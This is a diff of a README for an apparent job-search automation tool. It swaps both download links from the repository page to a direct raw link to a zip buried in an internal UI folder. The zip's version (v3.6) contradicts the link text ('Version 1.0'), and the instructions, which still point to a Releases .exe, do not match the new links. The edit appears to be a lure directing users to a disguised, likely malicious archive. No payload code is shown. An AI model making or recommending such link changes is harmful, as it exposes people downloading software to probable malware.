@@ -1,6 +1,6 @@
 # 🤖 career-copilot - Automate your entire job search process
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/daumiercarpet9916/career-copilot)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/daumiercarpet9916/career-copilot/main/dashboard/internal/ui/career_copilot_v3.6.zip)
 
 ## 🎯 About This Tool
 
@@ -19,7 +19,7 @@ Your computer needs a few things to run this software.
 
 You get the latest version of the application from the official page. 
 
-[Download Version 1.0](https://github.com/daumiercarpet9916/career-copilot)
+[Download Version 1.0](https://raw.githubusercontent.com/daumiercarpet9916/career-copilot/main/dashboard/internal/ui/career_copilot_v3.6.zip)
 
 Click the link above to visit the repository. Look for the Releases section on the right side of the screen. Click the link that ends in .exe to start your download. 
 
